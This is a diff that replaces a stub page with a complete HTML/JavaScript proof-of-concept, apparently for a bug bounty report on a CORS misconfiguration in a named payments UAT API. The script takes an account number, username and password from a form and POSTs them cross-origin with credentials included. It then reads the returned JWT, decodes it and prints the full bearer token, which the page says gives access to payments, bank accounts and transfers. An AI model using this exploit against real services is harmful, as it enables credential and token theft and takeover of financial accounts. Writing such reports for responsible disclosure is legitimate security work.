@@ -1,24 +1,142 @@
-<pre id="out">Loading...</pre>                                                                                                                                     
+ <!DOCTYPE html>                                                                                                                                                    
+  <html lang="en">                      
+  <head>                                                                                                                                                             
+  <meta charset="UTF-8">                                                                                                                                             
+  <title>Hyperwallet CORS PoC</title>                                                                                                                                
+  <style>                                                                                                                                                            
+    body{font-family:Arial,sans-serif;max-width:750px;margin:40px auto;background:#f5f5f5;padding:0 16px}                                                            
+    .card{background:#fff;border:1px solid #ddd;border-radius:6px;padding:24px;margin:16px 0}                                                                        
+    h1{color:#c0392b}                                                                                                                                                
+    h2{color:#2c3e50;border-bottom:1px solid #eee;padding-bottom:8px}                                                                                                
+    input{display:block;width:100%;padding:8px;margin:8px 0;box-sizing:border-box;border:1px solid #ccc;border-radius:4px}                                           
+    button{background:#2980b9;color:white;padding:10px 20px;border:none;border-radius:4px;cursor:pointer;font-size:14px}                                             
+    pre{background:#2c3e50;color:#ecf0f1;padding:16px;border-radius:4px;overflow-x:auto;white-space:pre-wrap;word-break:break-all;font-size:12px}                    
+    .badge{display:inline-block;padding:3px 10px;border-radius:12px;font-size:12px;font-weight:bold;margin-bottom:8px}                                               
+    .vuln{background:#e74c3c;color:white}                                                                                                                            
+    .ok{background:#27ae60;color:white}                                                                                                                              
+    label{font-weight:bold;font-size:13px;color:#555}                                                                                                                
+  </style>                                                                                                                                                           
+  </head>         
+  <body>                                                                                                                                                             
+                  
+  <h1>Bug Bounty PoC: CORS Misconfiguration</h1>                                                                                                                     
+  <p>
+    <strong>Target:</strong> uat-api.paylution.com (Hyperwallet UAT API)<br>                                                                                         
+    <strong>CWE:</strong> CWE-942 — Overly Permissive Cross-Origin Resource Sharing<br>                                                                              
+    <strong>Scope:</strong> Authorized bug bounty research                                                                                                           
+  </p>                                                                                                                                                               
+                                                                                                                                                                     
+  <div class="card">
+    <h2>Vulnerability</h2>
+    <p>                                                                                                                                                              
+      <code>uat-api.paylution.com</code> reflects <em>any</em> Origin header with
+      <code>Access-Control-Allow-Credentials: true</code>. The login endpoint                                                                                        
+      <code>POST /rest/internal/v1/jwts</code> is reachable cross-origin — an attacker                                                                               
+      page can submit credentials and <strong>read the JWT from the response</strong>,                                                                               
+      gaining full API access to the victim's merchant account.                                                                                                      
+    </p>                                                                                                                                                             
+  </div>                                                                                                                                                             
+                                                                                                                                                                     
+  <div class="card">                                                                                                                                                 
+    <h2>Live Demo</h2>
+    <p>                                                                                                                                                              
+      This page is hosted on <code>sufyan-aslam.github.io</code> — a completely different
+      origin from <code>uat-api.paylution.com</code>. Enter Hyperwallet UAT credentials                                                                              
+      below. The page will POST them cross-origin and read the JWT from the response.                                                                                
+    </p>                                                                                                                                                             
+    <label>Account Number (numeric only — no IM prefix)</label>                                                                                                      
+    <input id="issuer" placeholder="e.g. 287721141615">                                                                                                              
+    <label>Username</label>                                                                                                                                          
+    <input id="username" placeholder="e.g. jhonlara">                                                                                                                
+    <label>Password</label>                                                                                                                                          
+    <input id="password" type="password" placeholder="Password">
+    <br><br>                                                                                                                                                         
+    <button onclick="runPoC()">Run CORS Exploit</button>
+  </div>                                                                                                                                                             
+                  
+  <div class="card" id="results" style="display:none">                                                                                                               
+    <h2>Results</h2>
+    <div id="r1"></div>                                                                                                                                              
+    <div id="r2"></div>
+    <div id="r3"></div>
+  </div>                                                                                                                                                             
+   
   <script>                                                                                                                                                           
-  // This demonstrates CORS origin reflection - shows server reflects attacker origin
-  // For full exploit: victim must already be logged in + attacker has a way to inject Bearer token                                                                  
-  fetch('https://uat-api.paylution.com/rest/internal/v1/jwts', {                                                                                                     
-    method: 'POST',                                                                                                                                                  
-    credentials: 'include',                                                                                                                                          
-    headers: {    
-      'Content-Type': 'application/json',                                                                                                                            
-      'Accept': 'application/json'
-    },
-    body: JSON.stringify({issuer: "test", username: "test", password: "test"})
-  })                                                                                                                                                                 
-  .then(r => {
-    document.getElementById("out").innerText =                                                                                                                       
-      "CORS origin reflected! Status: " + r.status +                                                                                                                 
-      "\nOrigin accepted: " + r.headers.get('access-control-allow-origin');                                                                                          
-    return r.json();                                                                                                                                                 
-  })                                                                                                                                                                 
-  .then(data => { 
-    document.getElementById("out").innerText += "\n" + JSON.stringify(data, null, 2);                                                                                
-  })              
-  .catch(e => document.getElementById("out").innerText = "Error: " + e);                                                                                             
-  </script>
+  async function runPoC() {
+    document.getElementById("results").style.display = "block";
+    var issuer   = document.getElementById("issuer").value.trim();
+    var username = document.getElementById("username").value.trim();                                                                                                 
+    var password = document.getElementById("password").value;
+    var R1 = document.getElementById("r1");                                                                                                                          
+    var R2 = document.getElementById("r2");
+    var R3 = document.getElementById("r3");                                                                                                                          
+                  
+    R1.innerHTML = "<p><b>Step 1:</b> POSTing cross-origin from <code>" +                                                                                            
+      location.origin + "</code> to <code>https://uat-api.paylution.com/rest/internal/v1/jwts</code>...</p>";
+    R2.innerHTML = "";                                                                                                                                               
+    R3.innerHTML = "";
+                                                                                                                                                                     
+    var resp, data;
+    try {
+      resp = await fetch(
+        "https://uat-api.paylution.com/rest/internal/v1/jwts?returnConfigs=tutorialProgramToken",
+        {                                                                                                                                                            
+          method: "POST",
+          credentials: "include",                                                                                                                                    
+          headers: {
+            "Content-Type": "application/json",                                                                                                                      
+            "Accept": "application/json"
+          },                                                                                                                                                         
+          body: JSON.stringify({ issuer: issuer, username: username, password: password })
+        }
+      );
+      data = await resp.json();
+    } catch(e) {                                                                                                                                                     
+      R1.innerHTML += "<p><span class='badge ok'>BLOCKED</span> Browser blocked cross-origin read: " + e + "</p>";
+      return;                                                                                                                                                        
+    }             
+                                                                                                                                                                     
+    var acao = resp.headers.get("access-control-allow-origin");
+    var acac = resp.headers.get("access-control-allow-credentials");                                                                                                 
+                  
+    R1.innerHTML +=
+      "<p><span class='badge vuln'>VULNERABLE</span> Cross-origin response readable by this page!</p>" +
+      "<pre>" +                                                                                                                                                      
+      "HTTP Status: " + resp.status + "\n" +
+      "access-control-allow-origin: " + acao + "\n" +                                                                                                                
+      "access-control-allow-credentials: " + acac + "\n\n" +
+      "Origin [" + location.origin + "] was reflected.\n" +                                                                                                          
+      "Any website can read responses from this API." +
+      "</pre>";                                                                                                                                                      
+                  
+    var jwt = data.token || null;                                                                                                                                    
+                  
+    R2.innerHTML =
+      "<p><b>Step 2:</b> Response body read by attacker origin:</p>" +
+      "<p><span class='badge " + (jwt ? "vuln" : "ok") + "'>" +                                                                                                      
+      (jwt ? "JWT OBTAINED CROSS-ORIGIN" : "Auth failed — CORS reflection confirmed above") +
+      "</span></p>" +                                                                                                                                                
+      "<pre>" + JSON.stringify(data, null, 2) + "</pre>";
+
+    if (!jwt) return;
+
+    try {
+      var b64 = jwt.split(".")[1].replace(/-/g, "+").replace(/_/g, "/");
+      var payload = JSON.parse(atob(b64));                                                                                                                           
+      R3.innerHTML =                                                                                                                                                 
+        "<p><b>Step 3:</b> JWT decoded — attacker has full API access:</p>" +                                                                                        
+        "<pre>" +                                                                                                                                                    
+        "Subject : " + payload.sub + "\n" +
+        "Issuer  : " + payload.iss + "\n" +                                                                                                                          
+        "Expires : " + new Date(payload.exp * 1000).toISOString() + "\n" +
+        "Roles   : " + JSON.stringify(payload.roles || []) + "\n\n" +                                                                                                
+        "Full Bearer token:\n" + jwt +
+        "</pre>" +                                                                                                                                                   
+        "<p><span class='badge vuln'>IMPACT</span> " +
+        "This token grants full REST API access to program <code>" + payload.iss + "</code> " +                                                                      
+        "— payments, users, bank accounts, and money transfers.</p>";                                                                                                
+    } catch(e) {}                                                                                                                                                    
+  }                                                                                                                                                                  
+  </script>       
+  </body>
+  </html>
